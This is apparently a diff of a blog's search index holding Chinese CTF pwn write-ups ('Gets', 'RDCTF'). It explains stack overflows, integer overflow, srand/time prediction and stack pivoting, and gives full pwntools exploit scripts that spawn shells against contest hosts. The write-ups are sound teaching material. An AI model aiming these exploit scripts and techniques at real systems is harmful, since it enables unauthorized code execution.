+<p>然后最后就是orw的打法了。不过由于我们并没有去泄露libc基地址，而且高版本下，程序内纯净的pop rdx几乎没有。所幸，程序里存在init函数。所以我们可以通过ret2csu去构造read函数。然后最后用puts函数输出就好（用write太烦啦！毕竟还得打一次ret2csu）。</p>
 ]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
       <tags>
-        <tag>pwn入门</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -347,6 +371,26 @@
       </categories>
       <tags>
         <tag>pwn进阶</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gets</title>
+    <url>/2026/02/24/Gets/</url>
+    <content><![CDATA[<p>简单记录一道题，有利于帮助理解我们劫持的执行流。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序本身很简单，只存在一个gets函数的调用。同时还给了system函数。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">20922</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x401273</span></span><br><span class="line">bss = <span class="number">0x404040</span>+<span class="number">0x500</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(bss) + p64(elf.plt.gets) + p64(rdi) + p64(bss) + p64(rdi+<span class="number">1</span>) + p64(rdi+<span class="number">1</span>) + p64(elf.plt.system)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(pl)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里关键不存在puts等函数的调用。所以没办法打ret2libc。</p>
+<p>这里其实难理解的是执行流。可以看我们的pl。先是构造了一个gets(bss)。这个时候执行流实际上是等待我们的输入的。也就是我们输入的&#x2F;bin&#x2F;sh\x00被写进了bss的地址。而后才是再去调用system函数。不过这里需要两次ret来栈对齐。</p>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn入门</tag>
       </tags>
   </entry>
   <entry>
@@ -645,6 +689,82 @@
       </tags>
   </entry>
   <entry>
+    <title>RDCTF</title>
+    <url>/2026/01/20/RDCTF/</url>
+    <content><![CDATA[<h1 id="RDCTF"><a href="#RDCTF" class="headerlink" title="RDCTF"></a>RDCTF</h1><h2 id="1-Ret2text"><a href="#1-Ret2text" class="headerlink" title="1.Ret2text"></a>1.Ret2text</h2><p>简单的pwn的入门题。</p>
+<p>func函数里有read函数的栈溢出，溢出字节大小为0x20。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;you may be forgot something~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时观察里面有backdoor函数，那么直接劫持执行流到后门函数就好。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;121.29.138.132&#x27;</span>,<span class="number">30120</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">backdoor = <span class="number">0x401269</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;input:&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(backdoor)</span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里的backdoor的地址指向的是下面的汇编指令，这样就可以避免了堆栈平衡的因素。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     rax, command    ; &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
+
+<p>当然pl也可以写成下面这样。这样就是padding + ret + backdoor，考虑堆栈平衡的写法。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x40127a</span>) + p64(<span class="number">0x401261</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-Ret2sh"><a href="#2-Ret2sh" class="headerlink" title="2.Ret2sh"></a>2.Ret2sh</h2><p>和上面一题其实是差不多的。</p>
+<p>不过这里没单独给&#x2F;bin&#x2F;sh的形式。不过向system函数里传入sh,$0的参数也是可以成功getshell的。</p>
+<p>进gdb调试elf文件，输入search sh可以得到sh的地址为：0x402041。所以可以通过rdi传参来getshell。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.29.138.132&#x27;</span>,<span class="number">31290</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">rdi = <span class="number">0x4012ba</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(<span class="number">0x402041</span>) + p64(<span class="number">0x401264</span>)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;bin!&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当然还有一种做法，应该是非预期了，因为有些繁琐了。这里的read函数给出的溢出范围较大，所以可以直接按照ret2libc的打法去做。这里就不具体展开了。<br>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x4012ba</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bin!&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(elf.got.read) + p64(elf.plt.puts) + p64(elf.sym.RDCTF)</span><br><span class="line">io.send(pl1)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x114840</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + <span class="number">0x50d70</span></span><br><span class="line">binsh = base + <span class="number">0x1d8678</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(binsh) + p64(rdi+<span class="number">1</span>) + p64(sys)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里base的求法是不一样的，具体情况得根据远端实际的版本来判断，因为这里没有提供libc.so.6，所以各个函数的偏移量是不知道的，所以说是非预期。</p>
+<h2 id="3-Pwn"><a href="#3-Pwn" class="headerlink" title="3.Pwn!!"></a>3.Pwn!!</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">100</span>]; <span class="comment">// [esp+4h] [ebp-74h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n10; <span class="comment">// [esp+68h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 nbytes; <span class="comment">// [esp+6Eh] [ebp-Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;let me check you:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;remember no more than 10!!!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n10);</span><br><span class="line">  nbytes = n10;</span><br><span class="line">  <span class="keyword">if</span> ( n10 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;m furious, and I&#x27;m going to destroy the whole world!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;yeye... this is a gift you: %p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please come close to me:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看出我们输入的n10的值，就是后面我们read能读入的最大字节数。这里做了限制只能读入10个字节，那肯定是不够我们经行利用的。不过这里还做了转换，即nbytes＝n10。而nbytes又是个无符号数。所以这里存在整型溢出。只要我们输入-1就可以转化成32位程序的INT_MAX。</p>
+<p>后面又给了我们输入的首地址。所以可以通过调用system函数传参&#x2F;bin&#x2F;sh来getshell。但是这里又没有system函数。所以可以输入shellcode来getshell。下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;api.wdsec.com.cn&#x27;</span>,<span class="number">31998</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;10!!!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">pl = shell</span><br><span class="line">pl = pl.ljust(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(stack)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-灵魂舞步"><a href="#4-灵魂舞步" class="headerlink" title="4.灵魂舞步"></a>4.灵魂舞步</h2><p>保护情况。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/RDCTF/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>首先是进行一个RDCTF函数的检测。只有这个函数通过以后才会进入secret函数，也就是漏洞函数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">RDCTF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+4h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = rand() % <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Round %d: What is the secret number? &quot;</span>, i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v3 = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong number, try again later.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;All ten guesses correct. i will give you my serect\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，就是伪随机数。我们只需要去撞时间戳就行。所以可以引入ctypes库来绕过。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode()) </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后我们来看一下secret函数里做了什么。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">serect</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i love you&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wait wait,what do you want to do? %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Nothing here ,%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这里存在栈溢出，不过溢出字节只有0x10。那么很正常的可以想到栈迁移的手法来打。</p>
+<p>我们进gdb调试一下。</p>
+<p><img src="/images/RDCTF.png" alt="gdb"></p>
+<p>可以看出，当我们把0x30的地址都覆盖了以后，可以泄露出一处栈地址。那么我们就可以打栈上栈迁移了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;api.wdsec.com.cn&#x27;,31191)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc.srand(libc.time(0))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>):&#123;libc.srand(libc.time(<span class="number">0</span>))&#125;</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode()) </span><br><span class="line"><span class="comment">#io.sendline()</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;i love you\n&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(<span class="number">0x080493C5</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">_=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">stack=u32(io.recv(<span class="number">4</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>):&#123;libc.srand(libc.time(<span class="number">0</span>))&#125;</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">rsp = stack - <span class="number">0x50</span></span><br><span class="line"><span class="comment">#success(hex(rsp))</span></span><br><span class="line"><span class="comment">#success(hex(stack))</span></span><br><span class="line">leave = <span class="number">0x80493C3</span></span><br><span class="line">sys = <span class="number">0x80490b0</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(sys) + p32(<span class="number">0</span>) + p32(rsp+<span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pl = pl.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(rsp) + p32(leave)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这是我师傅写的脚本。而我之所以打不通，是因为没有考虑缓冲区的问题。</p>
+<p>我们进ida里可以发现main函数并没有初始化标准输入输出。而符号表中却有着init函数。同时在RDCTF函数中，有着fflush(stdout)。它刷新了缓冲区。所以导致我在打远端，等到第十次随机数绕过后，就没有了回显。所以第一次我们要先回到main函数，重新触发下fflush，来泄露出我们的栈地址。后面就是正常栈迁移的打法了。如果有不懂，可以看我别的文章里有讲。</p>
+<h1 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h1><p>缓冲区（buffer）分为三种类型：全缓冲，行缓冲和不带缓冲</p>
+<h2 id="1-全缓冲"><a href="#1-全缓冲" class="headerlink" title="1.全缓冲"></a>1.全缓冲</h2><p>在这种情况下，当填满标准I&#x2F;O缓存后，才进行实际I&#x2F;O操作。这里的I&#x2F;O可以理解为结构体。专门放我们写入的数据。典型代表是对磁盘文件的读写。</p>
+<h2 id="2-行缓冲"><a href="#2-行缓冲" class="headerlink" title="2.行缓冲"></a>2.行缓冲</h2><p>在这种情况下，当在输入和输出中遇到换行符(<code>&#39;\n&#39;</code>)时，执行真正的I&#x2F;O操作。这是，我们输入的字符先存放在缓冲区，等按下回车键换行时才进行实际的I&#x2F;O操作。典型代表是键盘输入数据。</p>
+<h2 id="3-不带缓冲"><a href="#3-不带缓冲" class="headerlink" title="3.不带缓冲"></a>3.不带缓冲</h2><p>不进行缓冲，标准出错情况stderr是典型代表，这使得出错信息可以直接尽快地显示出来。</p>
+<h2 id="4-缓冲区的刷新"><a href="#4-缓冲区的刷新" class="headerlink" title="4.缓冲区的刷新"></a>4.缓冲区的刷新</h2><ul>
+<li><p>缓冲区满时。</p>
+</li>
+<li><p>关闭文件。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>UAF</title>
     <url>/2026/02/19/UAF/</url>
     <content><![CDATA[<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a><code>UAF</code></h2><h3 id="Use-After-Free：即free后再次进行利用。"><a href="#Use-After-Free：即free后再次进行利用。" class="headerlink" title="Use After Free：即free后再次进行利用。"></a>Use After Free：即free后再次进行利用。</h3><p><code>Dangling Pointer</code>（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。</p>
@@ -814,82 +934,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RDCTF</title>
-    <url>/2026/01/20/RDCTF/</url>
-    <content><![CDATA[<h1 id="RDCTF"><a href="#RDCTF" class="headerlink" title="RDCTF"></a>RDCTF</h1><h2 id="1-Ret2text"><a href="#1-Ret2text" class="headerlink" title="1.Ret2text"></a>1.Ret2text</h2><p>简单的pwn的入门题。</p>
-<p>func函数里有read函数的栈溢出，溢出字节大小为0x20。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;you may be forgot something~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>同时观察里面有backdoor函数，那么直接劫持执行流到后门函数就好。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;121.29.138.132&#x27;</span>,<span class="number">30120</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">backdoor = <span class="number">0x401269</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;input:&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(backdoor)</span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里的backdoor的地址指向的是下面的汇编指令，这样就可以避免了堆栈平衡的因素。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     rax, command    ; &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
-
-<p>当然pl也可以写成下面这样。这样就是padding + ret + backdoor，考虑堆栈平衡的写法。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x40127a</span>) + p64(<span class="number">0x401261</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-Ret2sh"><a href="#2-Ret2sh" class="headerlink" title="2.Ret2sh"></a>2.Ret2sh</h2><p>和上面一题其实是差不多的。</p>
-<p>不过这里没单独给&#x2F;bin&#x2F;sh的形式。不过向system函数里传入sh,$0的参数也是可以成功getshell的。</p>
-<p>进gdb调试elf文件，输入search sh可以得到sh的地址为：0x402041。所以可以通过rdi传参来getshell。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.29.138.132&#x27;</span>,<span class="number">31290</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">rdi = <span class="number">0x4012ba</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(<span class="number">0x402041</span>) + p64(<span class="number">0x401264</span>)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;bin!&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>当然还有一种做法，应该是非预期了，因为有些繁琐了。这里的read函数给出的溢出范围较大，所以可以直接按照ret2libc的打法去做。这里就不具体展开了。<br>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x4012ba</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bin!&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(elf.got.read) + p64(elf.plt.puts) + p64(elf.sym.RDCTF)</span><br><span class="line">io.send(pl1)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x114840</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + <span class="number">0x50d70</span></span><br><span class="line">binsh = base + <span class="number">0x1d8678</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(binsh) + p64(rdi+<span class="number">1</span>) + p64(sys)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里base的求法是不一样的，具体情况得根据远端实际的版本来判断，因为这里没有提供libc.so.6，所以各个函数的偏移量是不知道的，所以说是非预期。</p>
-<h2 id="3-Pwn"><a href="#3-Pwn" class="headerlink" title="3.Pwn!!"></a>3.Pwn!!</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">100</span>]; <span class="comment">// [esp+4h] [ebp-74h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n10; <span class="comment">// [esp+68h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 nbytes; <span class="comment">// [esp+6Eh] [ebp-Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;let me check you:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;remember no more than 10!!!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n10);</span><br><span class="line">  nbytes = n10;</span><br><span class="line">  <span class="keyword">if</span> ( n10 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;m furious, and I&#x27;m going to destroy the whole world!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span 